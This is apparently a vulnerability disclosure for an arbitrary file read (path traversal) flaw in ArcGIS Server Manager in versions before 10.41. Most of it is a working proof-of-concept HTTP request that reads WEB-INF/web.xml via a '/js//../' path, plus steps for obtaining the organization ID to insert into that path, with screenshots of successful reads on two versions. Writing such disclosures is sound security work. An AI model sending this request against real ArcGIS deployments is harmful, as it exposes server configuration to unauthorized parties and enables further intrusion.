# arcgis arbitrary file reading vulnerability

# Vulnerability description

Through black box testing of the website, it was found that the arcgis system has an arbitrary file reading vulnerability.

An attacker can illegally obtain internal files of the system through ../ through the original directory of the system. This vulnerability has been tested in versions prior to 10.41.

The poc is as follows:

    GET /arcgis/manager/ID/js//../WEB-INF/web.xml HTTP/1.1
    Host: xx.xx.xx.xx
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
    Accept: */*
    Referer: http://xx.xx.xx.xx/arcgis/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=03439408E767FAF2B1A9FE416970E9C8
    Connection: close

The results are as follows, the contents of the web.xml file in the system are illegally obtained.

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/206872eb-3942-471c-a045-4153a879287f.png)

# Vulnerability details

Taking arcgis 10.22 version as an example to reproduce the vulnerability

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/17d7f10d-3b6f-4e78-a3d2-ebbff05a85f2.png)

Visit the URL [http://xx.xx.xx.xx:6070/arcgis/manager](http://xx.xx.xx.xx:6070/arcgis/manager) to enter the system management backend home page.

Obtain the ID value of the organization in the response packet. Here, we take organization ID 3552 as an example.

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/d9392442-c8bc-4ddb-8f5a-7febde59544b.png)

Construct a POC data packet and replace the ID value in the above data packet path

    GET /arcgis/manager/3552/js//../WEB-INF/web.xml HTTP/1.1
    Host: xx.xx.xx.xx
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
    Accept: */*
    Referer: http://xx.xx.xx.xx/arcgis/
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=03439408E767FAF2B1A9FE416970E9C8
    Connection: close

Successfully obtained the content of web.xml file

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/51c73d41-b3d8-4e90-83da-5b063eed4204.png)

Organization test 2, taking version 10.41 as an example, the organization ID is 5686

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/d71cd373-b913-43d8-a183-62a65ec85700.png)

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/49439eca-05b8-45b9-ac35-995af60babfc.png)

Constructing a data package and successfully reading data

![image](https://alidocs.oss-cn-zhangjiakou.aliyuncs.com/res/1GXn4Bd5yNyyODQ4/img/93928eca-72b7-4158-aa01-eaeab0801078.png)